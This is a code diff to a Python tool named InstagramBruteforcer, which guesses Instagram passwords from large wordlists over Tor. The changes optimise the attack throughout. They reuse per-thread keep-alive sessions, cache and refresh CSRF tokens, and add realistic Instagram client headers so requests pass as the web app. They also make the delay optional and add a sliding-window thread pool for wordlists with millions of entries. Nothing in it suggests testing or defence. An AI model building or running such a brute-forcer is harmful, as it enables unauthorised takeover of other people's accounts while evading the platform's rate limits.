@@ -15,7 +15,8 @@ import argparse
 import datetime
 import subprocess
 from pathlib import Path
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
+from concurrent.futures import ThreadPoolExecutor, FIRST_COMPLETED, wait
 
 import requests
 from requests.adapters import HTTPAdapter
@@ -235,6 +236,7 @@ class InstagramBruteforcer:
         self.total = 0
         self.start_time = None
         self.session_file = f".insta_bf_{username}.session"
+        self._local = threading.local()  # per-thread session + cached CSRF
 
         # Load passwords
         self.passwords = self._load_wordlist()
@@ -263,13 +265,18 @@ class InstagramBruteforcer:
         with open(path, "r", encoding="utf-8", errors="ignore") as f:
             return [line.strip() for line in f if line.strip()]
 
-    def _get_session(self) -> requests.Session:
-        """Create a requests session routed through Tor."""
+    def _build_session(self) -> requests.Session:
+        """Build a keep-alive session routed through Tor (one per worker thread).
+
+        Connection pooling reuses the same TCP/Tor connection across attempts,
+        which is the main per-attempt latency win over creating a new session
+        for every password.
+        """
         session = requests.Session()
 
-        # Retry
+        # Retry + connection pool (keep-alive)
         retries = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
-        adapter = HTTPAdapter(max_retries=retries)
+        adapter = HTTPAdapter(max_retries=retries, pool_connections=4, pool_maxsize=4)
         session.mount("https://", adapter)
         session.mount("http://", adapter)
 
@@ -279,7 +286,8 @@ class InstagramBruteforcer:
         # Cookies
         session.cookies.set("ig_cb", "2")
 
-        # Headers
+        # Headers — modern Instagram web client sends X-IG-App-ID / X-ASBD-ID.
+        # User-Agent is fixed per session so keep-alive stays consistent.
         session.headers.update({
             "User-Agent": random.choice(USER_AGENTS),
             "Referer": f"{BASE_URL}/",
@@ -287,9 +295,31 @@ class InstagramBruteforcer:
             "Accept-Language": "en-US,en;q=0.9",
             "Accept": "*/*",
             "X-Requested-With": "XMLHttpRequest",
+            "X-IG-App-ID": "936619743392459",  # public Instagram web app id
+            "X-ASBD-ID": "129477",
+            "Sec-Fetch-Site": "same-origin",
+            "Connection": "keep-alive",
         })
 
         return session
+
+    def _thread_session(self) -> requests.Session:
+        """Return this thread's reusable session, creating it once."""
+        sess = getattr(self._local, "session", None)
+        if sess is None:
+            sess = self._build_session()
+            self._local.session = sess
+            self._local.csrf = None
+        return sess
+
+    def _thread_csrf(self, session: requests.Session, force: bool = False) -> str:
+        """Return a cached CSRF token, fetching only when missing or forced."""
+        csrf = getattr(self._local, "csrf", None)
+        if csrf and not force:
+            return csrf
+        csrf = self._get_csrftoken(session)
+        self._local.csrf = csrf
+        return csrf
 
     def _get_csrftoken(self, session: requests.Session) -> str:
         try:
@@ -313,11 +343,12 @@ class InstagramBruteforcer:
         return f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{password}"
 
     def _attempt_login(self, password: str) -> dict:
-        session = self._get_session()
-        csrf = self._get_csrftoken(session)
-
+        session = self._thread_session()
+        csrf = self._thread_csrf(session)
         if not csrf:
-            return {"status": "error", "message": "csrf_failed"}
+            csrf = self._thread_csrf(session, force=True)  # one refresh attempt
+            if not csrf:
+                return {"status": "error", "message": "csrf_failed"}
 
         payload = {
             "username": self.username,
@@ -344,6 +375,10 @@ class InstagramBruteforcer:
                         "url": result.get("checkpoint_url", "")}
             if "feedback_required" in result or "spam" in str(result).lower():
                 return {"status": "blocked", "message": "feedback_required"}
+            # CSRF expired mid-run: drop cached token so the next attempt refreshes it
+            if result.get("message") in ("csrf token missing", "csrf token invalid"):
+                self._local.csrf = None
+                return {"status": "error", "message": "csrf_expired"}
             if result.get("message") == "user-agent mismatch":
                 return {"status": "ua_mismatch"}
             return {"status": "fail", "message": result.get("message", "wrong")}
@@ -393,25 +428,39 @@ class InstagramBruteforcer:
                 if self.found:
                     break
                 self._test_single(i + self.resume_from, password)
-                time.sleep(self.delay)
+                if self.delay:
+                    time.sleep(self.delay)
         else:
+            # Sliding-window pool: keep ~2x threads in flight at once instead of
+            # materializing the entire (millions-long) wordlist into futures.
+            jobs = enumerate(passwords_to_test)
+            window = self.threads * 2
             with ThreadPoolExecutor(max_workers=self.threads) as executor:
-                futures = {}
-                for i, password in enumerate(passwords_to_test):
-                    if self.found:
-                        break
-                    idx = i + self.resume_from
-                    future = executor.submit(self._attempt_login, password)
-                    futures[future] = (idx, password)
-                    time.sleep(self.delay * 0.5)
+                in_flight = {}
 
-                for future in as_completed(futures):
-                    idx, password = futures[future]
+                def _submit_next() -> bool:
                     try:
-                        result = future.result()
-                        self._handle_result(idx, password, result)
-                    except Exception as e:
-                        log.error(f"[#{idx}] Error: {e}")
+                        i, pw = next(jobs)
+                    except StopIteration:
+                        return False
+                    fut = executor.submit(self._attempt_login, pw)
+                    in_flight[fut] = (i + self.resume_from, pw)
+                    return True
+
+                for _ in range(window):
+                    if not _submit_next():
+                        break
+
+                while in_flight and not self.found:
+                    done, _ = wait(in_flight, return_when=FIRST_COMPLETED)
+                    for fut in done:
+                        idx, password = in_flight.pop(fut)
+                        try:
+                            self._handle_result(idx, password, fut.result())
+                        except Exception as e:
+                            log.error(f"[#{idx}] Error: {e}")
+                        if not self.found:
+                            _submit_next()
 
         elapsed = time.time() - self.start_time
         print("-" * 55)
